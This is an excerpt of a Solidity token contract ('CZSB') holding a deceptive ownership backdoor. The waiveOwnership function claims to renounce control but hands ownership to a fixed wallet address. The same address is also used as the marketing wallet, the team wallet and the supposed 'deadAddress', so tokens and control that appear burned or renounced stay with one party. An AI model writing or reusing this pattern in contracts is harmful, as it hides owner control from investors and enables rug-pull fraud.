...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xB361d254aa9D4dd1d4d813F2D1309CdE033155dD));
        _owner = address(0xB361d254aa9D4dd1d4d813F2D1309CdE033155dD);
    }
...
contract CZSB is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xB361d254aa9D4dd1d4d813F2D1309CdE033155dD);
    address payable public teamWalletAddress = payable(0xB361d254aa9D4dd1d4d813F2D1309CdE033155dD);
    address public immutable deadAddress = 0xB361d254aa9D4dd1d4d813F2D1309CdE033155dD;
